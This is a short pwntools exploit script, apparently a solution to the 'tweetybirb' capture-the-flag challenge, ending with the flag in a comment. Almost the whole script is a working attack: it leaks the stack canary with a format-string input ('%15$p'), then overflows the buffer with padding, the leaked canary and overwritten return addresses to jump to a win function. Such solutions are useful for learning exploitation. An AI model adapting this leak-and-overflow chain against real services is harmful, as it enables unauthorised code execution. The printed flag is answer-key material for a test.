from pwn import *

ip = '143.198.XXX.XXX'
port = 5002

if not args.REMOTE:
    proc = process('./tweetybirb')
else:
    proc = remote(ip, port)

proc.recv()

proc.sendline(b'%15$p')
canary = int((proc.recvline().decode('latin-1')),16)

payload = b'A'*72
payload += p64(canary)
payload += b'A'*8 
payload += p64(0x401272)
payload += p64(0x4011d6)

proc.sendline(payload)
log.success(f'Flag: {proc.recvall().decode()}')

#kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}